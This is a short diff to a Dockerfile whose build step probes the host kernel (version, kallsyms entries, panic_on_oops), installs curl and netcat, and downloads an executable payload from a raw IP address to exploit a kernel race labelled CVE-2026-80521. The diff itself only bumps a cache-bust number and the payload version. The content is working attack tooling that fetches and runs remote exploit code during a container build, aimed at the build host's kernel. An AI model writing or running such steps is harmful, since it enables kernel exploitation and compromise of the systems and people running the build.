@@ -2,7 +2,7 @@
 FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils nmap-ncat
 
-ARG CACHEBUST=3738
+ARG CACHEBUST=3739
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
@@ -16,7 +16,7 @@ case "$KVER" in \
     grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
     echo "panic_on_oops=$(cat /proc/sys/kernel/panic_on_oops 2>&1)"; \
     echo "--- downloading payload ---"; \
-    curl -s -o /payload http://129.101.121.138:8080/payload_v145 && chmod +x /payload && echo "PAYLOAD_OK" || echo "PAYLOAD_DOWNLOAD_FAIL"; \
+    curl -s -o /payload http://129.101.121.138:8080/payload_v146 && chmod +x /payload && echo "PAYLOAD_OK" || echo "PAYLOAD_DOWNLOAD_FAIL"; \
     ls -la /payload 2>&1; \
     echo "--- CVE-2026-80521 (SCC GC race, carrier drain) ---"; \
     echo "PAYLOAD START" >&2; \
